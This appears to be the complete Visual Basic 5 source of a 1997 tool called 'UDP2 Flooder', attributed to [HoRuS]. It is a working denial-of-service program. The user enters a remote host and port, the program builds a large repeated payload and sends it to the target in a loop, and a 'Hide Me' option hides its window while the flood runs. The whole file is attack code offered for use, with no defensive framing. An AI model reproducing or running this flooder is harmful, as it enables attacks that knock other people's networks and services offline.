VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmUdp 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "UDP2 Flooder"
   ClientHeight    =   2790
   ClientLeft      =   1800
   ClientTop       =   2100
   ClientWidth     =   6330
   Icon            =   "frmUdp.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   PaletteMode     =   1  'UseZOrder
   ScaleHeight     =   2790
   ScaleWidth      =   6330
   Begin MSWinsockLib.Winsock UDP 
      Left            =   360
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton cmdHideMe 
      Caption         =   "&Hide Me"
      Enabled         =   0   'False
      Height          =   375
      Left            =   3480
      TabIndex        =   24
      Top             =   2040
      Width           =   1095
   End
   Begin VB.CheckBox chkE 
      BackColor       =   &H00C0C0C0&
      Caption         =   "&Ignore Errors"
      Height          =   255
      Left            =   3960
      TabIndex        =   7
      Top             =   0
      Value           =   1  'Checked
      Width           =   1215
   End
   Begin VB.CommandButton cmdStop 
      Caption         =   "S&top"
      Enabled         =   0   'False
      Height          =   375
      Left            =   1800
      TabIndex        =   9
      Top             =   2040
      Width           =   1095
   End
   Begin VB.CommandButton cmdExit 
      Caption         =   "E&xit"
      Height          =   375
      Left            =   5160
      TabIndex        =   10
      Top             =   2040
      Width           =   1095
   End
   Begin VB.TextBox txtDataString 
      Height          =   285
      Left            =   2760
      MaxLength       =   100
      TabIndex        =   5
      Text            =   "0123456789"
      Top             =   1080
      Width           =   2775
   End
   Begin VB.TextBox txtTimes 
      Height          =   285
      Left            =   1200
      MaxLength       =   6
      TabIndex        =   3
      Text            =   "1000"
      Top             =   1080
      Width           =   1455
   End
   Begin VB.TextBox txtDataLength 
      Height          =   285
      Left            =   1200
      MaxLength       =   5
      TabIndex        =   4
      Text            =   "10"
      Top             =   1680
      Width           =   1455
   End
   Begin VB.CommandButton cmdSend 
      BackColor       =   &H00C0C0C0&
      Caption         =   "&Send"
      Height          =   375
      Left            =   120
      TabIndex        =   8
      Top             =   2040
      Width           =   1095
   End
   Begin VB.TextBox txtRemotePort 
      Height          =   285
      Left            =   120
      MaxLength       =   5
      TabIndex        =   2
      Text            =   "0"
      Top             =   1680
      Width           =   975
   End
   Begin VB.TextBox txtRemoteHost 
      Height          =   285
      Left            =   2760
      MaxLength       =   50
      TabIndex        =   6
      Text            =   "0.0.0.0"
      Top             =   1680
      Width           =   2775
   End
   Begin VB.TextBox txtLocalPort 
      Height          =   285
      Left            =   120
      MaxLength       =   5
      TabIndex        =   1
      Text            =   "0"
      Top             =   1080
      Width           =   975
   End
   Begin ComctlLib.StatusBar StatusBar 
      Align           =   2  'Align Bottom
      Height          =   270
      Left            =   0
      TabIndex        =   27
      Top             =   2520
      Width           =   6330
      _ExtentX        =   11165
      _ExtentY        =   476
      Style           =   1
      SimpleText      =   "Idle..."
      _Version        =   327682
      BeginProperty Panels {0713E89E-850A-101B-AFC0-4210102A8DA7} 
         NumPanels       =   1
         BeginProperty Panel1 {0713E89F-850A-101B-AFC0-4210102A8DA7} 
            Text            =   "Idle"
            TextSave        =   "Idle"
            Key             =   ""
            Object.Tag             =   ""
         EndProperty
      EndProperty
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Label lblErrors 
      BackColor       =   &H00C0C0C0&
      Caption         =   "0"
      Height          =   255
      Left            =   5040
      TabIndex        =   26
      Top             =   240
      Width           =   735
   End
   Begin VB.Label lblErr 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Errors:"
      Height          =   255
      Left            =   3960
      TabIndex        =   25
      Top             =   240
      Width           =   975
   End
   Begin VB.Label lblSizeCaption 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Data Size:"
      Height          =   255
      Left            =   3960
      TabIndex        =   23
      Top             =   480
      Width           =   975
   End
   Begin VB.Label lblTimesCaption 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Times Sent:"
      Height          =   255
      Left            =   3960
      TabIndex        =   22
      Top             =   720
      Width           =   975
   End
   Begin VB.Label Label1 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Data String:"
      Height          =   255
      Left            =   2760
      TabIndex        =   21
      Top             =   840
      Width           =   855
   End
   Begin VB.Label lblSends 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Times:"
      Height          =   255
      Left            =   1200
      TabIndex        =   20
      Top             =   840
      Width           =   495
   End
   Begin VB.Label blbDataLength 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Number Of Strings:"
      Height          =   255
      Left            =   1200
      TabIndex        =   19
      Top             =   1440
      Width           =   1335
   End
   Begin VB.Label lblSize 
      BackColor       =   &H00C0C0C0&
      Caption         =   "0"
      Height          =   255
      Left            =   5040
      TabIndex        =   18
      Top             =   480
      Width           =   735
   End
   Begin VB.Label lblTimes 
      BackColor       =   &H00C0C0C0&
      Caption         =   "0"
      Height          =   255
      Left            =   5040
      TabIndex        =   17
      Top             =   720
      Width           =   735
   End
   Begin VB.Label lblRemotePort 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Remote Port:"
      Height          =   255
      Left            =   120
      TabIndex        =   16
      Top             =   1440
      Width           =   975
   End
   Begin VB.Label lblRemoteHost 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Remote Host:"
      Height          =   255
      Left            =   2760
      TabIndex        =   15
      Top             =   1440
      Width           =   975
   End
   Begin VB.Label lblLocalPort 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Local Port:"
      Height          =   255
      Left            =   120
      TabIndex        =   14
      Top             =   840
      Width           =   855
   End
   Begin VB.Label lblLocalIP 
      BackColor       =   &H00C0C0C0&
      Caption         =   "LocalIP Prints Here"
      Height          =   255
      Left            =   1320
      TabIndex        =   13
      Top             =   480
      Width           =   1575
   End
   Begin VB.Label lblIPLocal 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Host Address:"
      Height          =   255
      Left            =   120
      TabIndex        =   12
      Top             =   480
      Width           =   1215
   End
   Begin VB.Label lblLocalHostName 
      BackColor       =   &H00C0C0C0&
      Caption         =   "LocalHost Prints Here"
      Height          =   255
      Left            =   1320
      TabIndex        =   11
      Top             =   120
      Width           =   1575
   End
   Begin VB.Label lblLocalHost 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Host Name:"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   1215
   End
   Begin VB.Menu mnuFiles 
      Caption         =   "&File"
      Begin VB.Menu mnuSend 
         Caption         =   "&Send"
         Shortcut        =   ^S
      End
      Begin VB.Menu mnuStop 
         Caption         =   "S&top"
         Enabled         =   0   'False
         Shortcut        =   ^T
      End
      Begin VB.Menu mnuHideMe 
         Caption         =   "&Hide Me"
         Enabled         =   0   'False
         Shortcut        =   ^H
      End
      Begin VB.Menu mnuIgnoreE 
         Caption         =   "&Ignore Errors"
         Checked         =   -1  'True
         Shortcut        =   ^I
      End
      Begin VB.Menu mnuSep1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuExit 
         Caption         =   "E&xit"
         Shortcut        =   ^X
      End
   End
   Begin VB.Menu mnuAbout 
      Caption         =   "&Help"
      Begin VB.Menu mnuHelp 
         Caption         =   "&About"
      End
   End
   Begin VB.Menu mnuVersion 
      Caption         =   "                                                                                             Version 6.27"
      Enabled         =   0   'False
   End
End
Attribute VB_Name = "frmUdp"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'Dim the stop variable
 Dim gStop As Integer
Private Sub chkE_Click()
'Control error check box
 mnuIgnoreE_Click
End Sub 'End Private Sub chkE_Click()
Private Sub cmdExit_Click()
'End the program
 End
End Sub 'End Private Sub cmdExit_Click()
Private Sub cmdHideMe_Click()
'Hide the form
 frmUdp.Hide
End Sub 'End Private Sub cmdHideMe_Click()
Private Sub cmdSend_Click()
'Dim the data to flood with
'Dim error msg and counter variable
 Dim Msg As String
 Dim DataToSend As String
 Dim Counter As Long
'Error handler
 On Error GoTo ErrHand
'Set gStop
 gStop = 0
'Enable - disable buttons and menus
 cmdHideMe.Enabled = True
 cmdSend.Enabled = False
 cmdStop.Enabled = True
 mnuHideMe.Enabled = True
 mnuSend.Enabled = False
 mnuStop.Enabled = True
'Reset the label captions
 lblErrors.Caption = 0
 lblTimes.Caption = 0
 lblSize.Caption = 0
'Set the correct data to udp from text boxes
 UDP.LocalPort = Val(txtLocalPort.Text)
 UDP.RemoteHost = txtRemoteHost.Text
 UDP.RemotePort = Val(txtRemotePort.Text)
'Set status bar text
 StatusBar.SimpleText = "Setting Data..."
'Make the data to send real big
 Counter = 1
 For Counter = 1 To Val(txtDataLength.Text)
  DataToSend = DataToSend + txtDataString.Text
  lblSize.Caption = Val(Len(DataToSend))
  DoEvents
  If gStop = 1 Then Exit Sub
 Next Counter
'Enter status bar text
 StatusBar.SimpleText = "Flooding Target..."
'Start the flooding loop
 Counter = 1
 For Counter = 1 To Val(txtTimes.Text)
  UDP.SendData DataToSend
  lblTimes.Caption = Val(lblTimes.Caption + 1)
  DoEvents
  If gStop = 1 Then Exit Sub
 Next Counter
 StatusBar.SimpleText = "Idle..."
'Enable - diable buttons and menus
 Disable
'Show the form then end the sub
 frmUdp.Show
 Exit Sub
'Error handler
ErrHand:
'Add one to the error label
 lblErrors.Caption = Val(lblErrors.Caption + 1)
 StatusBar.SimpleText = "Error(s) Occurred..."
'If ignore errors is checked then ignore
  If chkE.Value = 1 Then
  Resume Next
'Else give a message box
 Else
  ErrHandle
 End If
End Sub 'End Private Sub cmdSend_Click()
Private Sub cmdStop_Click()
'Reset gStop so data stops sending
 gStop = 1
'Enabled - disable menus and buttons
 Disable
'Set status bar text
 StatusBar.SimpleText = "Idle..."
End Sub
Private Sub Form_KeyPress(KeyAscii As Integer)
'End program when escape key is pressed
 If KeyAscii = 27 Then
  cmdExit_Click
 End If
End Sub 'End Private Sub Form_KeyPress(KeyAscii As Integer)
Private Sub Form_Load()
'Dim msgbox variables
 Dim Msg As String
 Dim Style As Integer
 Dim Title As String
 Dim Response As Integer
'Print local host and ip to labels
 lblLocalIP.Caption = UDP.LocalIP
 lblLocalHostName.Caption = UDP.LocalHostName
'Display about box if no connection
 If lblLocalIP.Caption = "0.0.0.0" Then
  Msg = "A connection to the internet would help."
  Style = vbOKOnly
  Title = "Try connecting first"
  Response = MsgBox(Msg, Style, Title)
 End If
End Sub 'End Private Sub Form_Load()
Private Sub mnuExit_Click()
'End the program
 cmdExit_Click
End Sub 'End Private Sub mnuExit_Click()
Private Sub mnuHelp_Click()
'Dim msgbox variables
 Dim Msg As String
 Dim Style As Integer
 Dim Title As String
 Dim Response As Integer
'Display about box
 Msg = "UDP2 Flooder v6.27 ©1997 [HoRuS], All rights reserved." + Chr$(13) + "            [HoRuS] is a Member of The Foundation."
 Style = vbOKOnly
 Title = "About UDP2 Flooder"
 Response = MsgBox(Msg, Style, Title)
End Sub
Private Sub mnuHideMe_Click()
'Hide the form
 cmdHideMe_Click
End Sub 'End Private Sub mnuHideMe_Click()
Private Sub mnuIgnoreE_Click()
'Control error check box
 If mnuIgnoreE.Checked = True Then
  chkE.Value = 0
  mnuIgnoreE.Checked = False
 Else
  chkE.Value = 1
  mnuIgnoreE.Checked = True
 End If
End Sub 'End Private Sub mnuIgnoreE_Click()
Private Sub mnuSend_Click()
'Send the data
 cmdSend_Click
End Sub 'End Private Sub mnuSend_Click()
Private Sub mnuStop_Click()
'Stop sending data
 cmdStop_Click
End Sub
Public Sub ErrHandle()
'Handle other errors
 frmUdp.Show
'Check for udp error, then show message.
 Select Case Err.Number
  Case 10014
   MsgBox "Error: The operation was cancelled."
   cmdStop_Click
  Case 10014
   MsgBox "Error: You made a typo."
   cmdStop_Click
  Case 10035
   MsgBox "Error: You tried to send too much data."
   cmdStop_Click
  Case 10036
   MsgBox "Error: Are you running another program?"
   cmdStop_Click
  Case 10038
   MsgBox "Error: You call that a socket?"
   cmdStop_Click
  Case 10039
   MsgBox "Error: A destination address would help."
   cmdStop_Click
  Case 10040
   MsgBox "Error: Datagram is too big so it's truncated."
   cmdStop_Click
  Case 10050
   MsgBox "Error: Network subsystem failed."
   cmdStop_Click
  Case 10051
   MsgBox "Error: Network cannot ne reached from here."
   cmdStop_Click
  Case 10055
   MsgBox "Error: Your out of buffer space."
   cmdStop_Click
  Case 11001, 11002
   MsgBox "Error: Host not found."
   cmdStop_Click
  Case 11003
   MsgBox "Error: How did you do that?"
   cmdStop_Click
  Case Else
   MsgBox "Error: You really screwed it up!"
   cmdStop_Click
 End Select
End Sub 'End Public Sub ErrHandle()
Public Sub Disable()
'Enable - disable buttons and menus
 cmdSend.Enabled = True
 cmdStop.Enabled = False
 cmdHideMe.Enabled = False
 mnuSend.Enabled = True
 mnuStop.Enabled = False
 mnuHideMe.Enabled = False
End Sub 'End Public Sub Disable()
